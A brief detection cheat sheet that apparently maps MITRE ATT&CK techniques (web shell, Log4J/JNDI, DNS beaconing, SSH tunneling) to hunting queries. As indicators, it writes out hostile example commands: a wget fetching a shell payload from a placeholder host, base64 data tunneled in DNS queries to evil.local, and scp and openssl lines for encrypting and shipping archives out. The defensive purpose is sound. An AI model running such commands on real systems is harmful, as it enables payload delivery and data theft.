# Web Shell Execution [T1505.003](https://attack.mitre.org/techniques/T1505/003/)
1. Look within the ```/var/log/[browser]/access.log``` log file for GET or POST requests.  

# Active Network Connections
1. Use ```osquery``` with ```SELECT pid, family, remote_address, remote_port, local_address, local_port, state FROM process_open_sockets LIMIT 20;```. 

# Find JNDI Exploitation/Log4J [T1190](https://attack.mitre.org/techniques/T1190/)
1. Look for log traffic with ```wget http[:]//awk3hd9encccccA_diesla[:]8000/get_shell_payload``` and ```java log4j_execution.java wget http://awk3hd9encccccA_diesla:8000/get_shell_payload``` like attempts. It should contain Java within the command. 

# DNS Beaconing [T1071.004](https://attack.mitre.org/techniques/T1071/004/)
1. Look for DNS traffic that contains encoded DNS question names like "dns.question.name	cm9vdEAxOTguNTEuMTAwLjI2LTg3NDU2dy1sc2xlZDEyLVNVU0UtNC4xMi4xNC05NC40MS1kZWZhdWx0ICMxIFNNUCBXZWQgT2N0IDMxIDEyOjI1OjA0IFVUQyAyMDE4ICgzMDkwOTAxKQo=.evil.local". Which decodes to DNS beacon. 

# SSH Tunneling [T1572](https://attack.mitre.org/techniques/T1572/)
1. Look for tunneling with command line similar to ```scp -o StrictHostKeyChecking=no -o BatchMode=yes ssh.tar.gz vagrant@198.51.100.2:/tmp```. 
2. Look for use of openssl to encrypt data before tunneling takes place with ```openssl enc -aes-256-cbc -salt -pass pass:test123 -in /home/ransom_test/upload.tar.gz -out /home/ransom_test/encrypted_upload.tar.gz```. 
